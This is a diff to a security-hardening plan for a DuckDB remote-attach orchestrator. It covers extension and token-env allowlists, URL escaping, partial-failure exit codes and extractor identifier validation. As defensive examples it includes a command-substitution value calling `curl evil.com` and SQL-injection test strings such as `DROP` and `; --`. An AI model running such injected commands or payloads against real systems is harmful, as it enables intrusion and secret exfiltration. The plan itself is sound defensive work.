@@ -87,11 +87,8 @@ if extension not in _ALLOWED_EXTENSIONS:
 Initial allowlist (in `orchestrator_security.py`):
 ```python
 _ALLOWED_EXTENSIONS = {
-    "keboola",   # Keboola Storage extension (community)
-    "bigquery",  # BigQuery extension (community)
-    "postgres",  # built-in
-    "mysql",     # built-in
-    "sqlite",    # built-in
+    "keboola",   # community
+    "bigquery",  # community
 }
 ```
 
@@ -99,12 +96,29 @@ Operators who need a different extension can override via env var:
 `AGNES_REMOTE_ATTACH_EXTENSIONS=keboola,bigquery,custom_thing`. Document this in
 `config/.env.template` and `docs/DEPLOYMENT.md`.
 
-**Side note on `INSTALL FROM community`**: keep the `INSTALL` step but only for
-extensions on the allowlist. Long term, we should pre-install allowed extensions at
-image build time and skip the runtime `INSTALL` entirely (separate cleanup, not part
-of this PR).
+**`INSTALL FROM community` is wrong for built-ins.** Reviewer note: `postgres`,
+`mysql`, `sqlite` are built-in DuckDB extensions — `INSTALL postgres FROM
+community` would fail. The `src/db.py:411` read-only path already handles this
+correctly with `LOAD` only. This PR splits the install path into two branches:
 
-### A.2 Token-env-var allowlist
+```python
+if extension in _BUILTIN_EXTENSIONS:        # {"postgres", "mysql", "sqlite", ...}
+    conn.execute(f"LOAD {extension};")       # no INSTALL
+else:                                        # community
+    conn.execute(f"INSTALL {extension} FROM community; LOAD {extension};")
+```
+
+Built-ins are not added to the default `_ALLOWED_EXTENSIONS` until a connector
+needs them (we currently have no connectors using direct `postgres`/`mysql`/
+`sqlite` attaches; if/when one ships, add it via the operator override env or
+extend the default).
+
+A future cleanup (separate PR, tracked) is to pre-install community extensions
+at image build time so the runtime `INSTALL FROM community` step disappears
+entirely. That removes the supply-chain risk on the community registry and is
+strictly better than allowlisting at install time.
+
+### A.2 Token-env-var allowlist (hard allowlist, not denylist)
 
 Today (`src/orchestrator.py:224`):
 ```python
@@ -121,20 +135,39 @@ if token_env and not _is_allowed_token_env(token_env):
 token = os.environ.get(token_env, "") if token_env else ""
 ```
 
+**Reviewer correction**: an earlier draft of this plan proposed a structural
+`_TOKEN/_API_KEY/_AUTH` suffix rule + denylist of well-known secrets. That is
+backwards — it requires future maintainers to remember to denylist every new
+runtime secret as it gets added. A hard allowlist is the safer policy.
+
 Allowlist policy:
-- Names must match `^[A-Z][A-Z0-9_]{0,63}$` (already implied — env var convention).
-- Must NOT match a denylist of well-known runtime secrets:
-  `JWT_SECRET_KEY`, `SESSION_SECRET`, `DATABASE_URL`, `OPENAI_API_KEY`, …
-- Must match one of:
-  - the suffix pattern `_TOKEN`, `_API_KEY`, `_SECRET_TOKEN`, `_AUTH`, OR
-  - an explicit allowlist `AGNES_REMOTE_ATTACH_TOKEN_ENVS` (comma-separated env-var
-    names) for cases where the convention does not hold.
+```python
+_DEFAULT_TOKEN_ENVS = {
+    "KBC_TOKEN",
+    "KBC_STORAGE_TOKEN",
+    "KEBOOLA_STORAGE_TOKEN",
+    "GOOGLE_APPLICATION_CREDENTIALS",  # path, not a secret value
+}
+```
 
-The point is to make accidental exfiltration impossible by structure. A connector that
-writes `token_env = "SESSION_SECRET"` is not asking for credentials, it's asking the
-orchestrator to send our session-signing key to its server.
+Operator override:
+```
+AGNES_REMOTE_ATTACH_TOKEN_ENVS=KBC_TOKEN,KEBOOLA_STORAGE_TOKEN,MY_CUSTOM_TOKEN
+```
 
-### A.3 URL escape
+The operator override **replaces** the default (not unions with it) so an
+operator can shrink the allowlist as well as expand it. Names must additionally
+match `^[A-Z][A-Z0-9_]{0,63}$` to refuse anything that wouldn't be a valid env
+var (defense against weird input — a malicious connector cannot inject
+`token_env = "$(curl evil.com)"` and have that survive the regex even if it
+somehow ends up in the allowlist).
+
+The trade-off vs. a structural rule: an operator with a new third-party
+service has to add its env-var name to `AGNES_REMOTE_ATTACH_TOKEN_ENVS` once.
+That is acceptable friction; the alternative is silent `OPENAI_API_KEY`
+exfiltration the day someone adds it for an LLM feature.
+
+### A.3 URL escape (single-quote only, no scheme allowlist)
 
 Today (`src/orchestrator.py:246, 251`):
 ```python
@@ -148,16 +181,24 @@ safe_url = url.replace("'", "''")
 conn.execute(f"ATTACH '{safe_url}' AS {alias} (TYPE {extension}, TOKEN '{escaped_token}')")
 ```
 
-Plus a scheme allowlist on `url`:
-```python
-parsed = urlparse(url)
-if parsed.scheme not in _ALLOWED_URL_SCHEMES:  # {"https", "bigquery", "postgres", ...}
-    logger.error("Remote attach %s: URL scheme %r not allowed", alias, parsed.scheme)
-    continue
-```
+**Reviewer correction**: an earlier draft proposed a URL scheme allowlist
+(`{"https", "bigquery", …}`). This breaks BigQuery, which uses
+`'project=<id>'` as the URL form (no scheme at all — `urlparse(...).scheme == ""`,
+see `connectors/bigquery/extractor.py:82`). Different DuckDB extensions use
+wildly different URL forms; there is no portable scheme rule.
 
-This prevents `file://` (local file disclosure), `http://` (token-in-clear), and any
-scheme the underlying DuckDB extension might support that we did not intend to expose.
+Decision for this PR: drop the scheme allowlist. The single-quote escape +
+extension allowlist + token-env allowlist together close the actual injection
+and exfiltration paths. A future enhancement (separate PR, scoped to specific
+extensions where it makes sense) could add a `(extension, url-pattern)` matrix
+— e.g. for the `keboola` extension assert the URL starts with `https://` since
+that extension does use HTTPS — but doing so generally is wrong.
+
+The `file://` concern is real but mitigated by the extension allowlist: an
+extension that interprets `file://` URLs (like `httpfs` if added) would have
+to be on the allowlist first. The dangerous case is "a connector we trust
+silently accepts `file://`"; if that turns out to be true for `keboola` or
+`bigquery`, scope the URL form per-extension at that point.
 
 ### A.4 Tests
 
@@ -221,12 +262,34 @@ with a custom connector breaks. Mitigation: prominent ERROR log + the override e
 +        exit(2)  # partial failure — distinct exit code so the scheduler/cron can alert
 ```
 
-### B.2 Scheduler integration
+### B.2 Sync API integration (corrected — scheduler does NOT spawn extractors)
 
-`services/scheduler/run.py` (or wherever the scheduler dispatches connectors) treats
-exit code 2 as a partial-failure signal: log loudly, mark `sync_state.status =
-"partial_failure"` for the source, do NOT advance `last_successful_sync_at`. The
-existing behavior for exit 0/1 is unchanged.
+**Reviewer correction**: an earlier draft said `services/scheduler/run.py`
+treats the exit code. That is wrong. `services/scheduler/__main__.py:62-65`
+only POSTs to `/api/sync/trigger` and `/api/health` over HTTP — it never sees
+the extractor's exit code. The actual subprocess invocation lives at
+`app/api/sync.py:122-135`, which captures `result.returncode` and only logs
+it (lines 132-135 — "Extractor FAILED (exit %d)" / "Extractor OK").
+
+The integration point is therefore **`app/api/sync.py`**, not the scheduler:
+
+```python
+# app/api/sync.py around line 132-135
+if result.returncode == 0:
+    sync_state_repo.mark_success(source_name=source, sha=meta_sha, ts=now)
+elif result.returncode == 2:
+    sync_state_repo.mark_partial(source_name=source, ts=now,
+                                  detail=result.stderr[-500:])
+    # do NOT advance last_successful_sync_at; do NOT publish updated views
+    # for the failed tables; orchestrator.rebuild_source skips them
+else:  # 1 or other non-zero
+    sync_state_repo.mark_failure(source_name=source, ts=now,
+                                  detail=result.stderr[-500:])
+```
+
+This requires extending `SyncStateRepository` with a `mark_partial` method and
+adding a `partial_failure` value to the `sync_state.status` column's accepted
+set. New regression test `test_sync_api_handles_partial_failure_exit_code`.
 
 ### B.3 Tests
 
@@ -299,24 +362,90 @@ strictly better than today's last-write-wins.
   and resolve by renaming the connector-side table.
 ```
 
-## 6. Sequencing
+## 6. Group D — extractor-side identifier injection (M15, missing from earlier draft)
+
+**Branch:** `zs/fix-81-extractor-identifier-validation`.
+**Reviewer correction**: the earlier draft skipped M15 entirely. M15 is the
+peer of M15 (the `_meta.table_name` SQLi which `_validate_identifier` already
+fixed at the orchestrator level) but at the **extractor** level. Same trust
+problem: an attacker who controls `table_registry` (admin or the registry-
+write API surface) can inject SQL via identifier interpolation.
+
+### D.1 Affected sites
+
+`connectors/keboola/extractor.py`:
+- `:103-105` — bucket / source_table interpolation in CREATE VIEW.
+- `:128` — table_name in INSERT INTO _meta.
+- `:175-176` — bucket / source_table in COPY TO parquet.
+
+`connectors/bigquery/extractor.py`:
+- `:95-96` — dataset / source_table in CREATE OR REPLACE VIEW.
+
+### D.2 Fix
+
+Reuse the already-existing `_validate_identifier` from `src/orchestrator.py`
+(lift it to a shared `src/identifier_validation.py`) and gate every
+identifier interpolation in both extractors. Refuse the row with an ERROR
+log, do not crash the whole extraction.
+
+### D.3 Tests
+
+`tests/test_extractor_identifier_validation.py` — registry rows with
+`table_name = "evil\"; DROP …"`, `bucket = "x; --"`, etc. Asserts the
+extractor logs ERROR and skips that row but continues processing valid rows
+in the same registry.
+
+### D.4 Sequencing
+
+D can ship in parallel with A — they touch different files — but both should
+land before the next public release.
+
+## 7. Sequencing
 
 | PR | Branch | Depends on | Ship before |
 |---|---|---|---|
-| A — C1 hardening | `zs/fix-81-orchestrator-attach-hardening` | — | next public release |
+| A — orchestrator C1 hardening | `zs/fix-81-orchestrator-attach-hardening` | — | next public release |
+| D — extractor identifier validation (M15) | `zs/fix-81-extractor-identifier-validation` | — | next public release |
 | B — partial-failure exit | `zs/fix-81-keboola-partial-failure` | — | next minor |
-| C — view collisions | `zs/fix-81-view-collision-detection` | A merged (so the security path is clean before adding feature work to the same file) | next minor |
+| C — view collisions | `zs/fix-81-view-collision-detection` | A merged (security path clean before feature work in the same file) | next minor |
 
-A is a blocker for the public OSS release (paired with the rest of #88's leak cleanup).
+A and D are blockers for the public OSS release (paired with #88's leak cleanup).
 B and C can land any time after.
 
-## 7. Open questions for review
+## 8. Open questions for review (revised)
 
-- **Allowlist source of truth.** Are operator overrides via env vars enough, or do we
-  want a YAML allowlist in `instance.yaml`? Env vars are simpler; YAML is auditable.
-- **Token-env naming convention.** Is the `_TOKEN/_API_KEY/_AUTH` suffix rule too loose
-  (a connector can still ask for `AWS_ACCESS_KEY_AUTH` if such env exists)? An explicit
-  allowlist + denylist may be enough; the suffix rule was a convenience that
-  back-stops the human-error case.
-- **Scheme allowlist for non-HTTP extensions.** BigQuery uses a `bigquery://` URL?
-  Let me confirm before finalising the scheme list.
+The original draft asked three questions; reviewer answered or invalidated all
+three. Replaced with the questions still genuinely open:
+
+- **Operator override semantics.** `AGNES_REMOTE_ATTACH_EXTENSIONS` and
+  `AGNES_REMOTE_ATTACH_TOKEN_ENVS` — should these **replace** the default
+  allowlist or **extend** it? This plan says replace (allows shrinking) but
+  that means a typo silently disables a working integration. Extend-only is
+  safer but couples operators to the default forever. Lean toward replace +
+  loud startup log of the effective allowlist so a typo is visible.
+
+- **Group C escape hatch — registry-side aliasing.** Reviewer correctly noted
+  that "operator renames one side" is operationally hostile when the source
+  side is a vendor (Keboola bucket name). The `table_registry` already has
+  `name` (display name) separate from `source_table` (vendor name); the
+  collision-reject path can suggest renaming `name` rather than the source
+  table. Add this hint to the ERROR message in C.2.
+
+- **Pre-install community extensions at image build.** A.1 keeps runtime
+  `INSTALL FROM community`. The cleaner long-term fix is to pre-install at
+  build time. Open: do we land that as part of this PR sequence or schedule
+  it separately? Build-time install changes the Docker image and CI; if
+  we delay it, supply-chain risk on the community registry persists. Lean
+  toward separate PR after A lands.
+
+## 9. Confirmed (no longer open)
+
+- ✅ Scheme allowlist on URL — **dropped** (BigQuery has no scheme,
+  `connectors/bigquery/extractor.py:82`).
+- ✅ INSTALL vs LOAD — **split** by built-in vs community in A.1.
+- ✅ Token-env policy — **hard allowlist**, no suffix rule.
+- ✅ Schema version for Group C — current is v9 (`src/db.py:19`), so v10 is
+  correct. No other in-flight PR is claiming v10.
+- ✅ Exit code 2 in Group B — no conflict with other connectors
+  (`grep "exit(" connectors/` returns only 0 / 1).
+- ✅ Scheduler integration — **not in scheduler**, see B.2 correction.
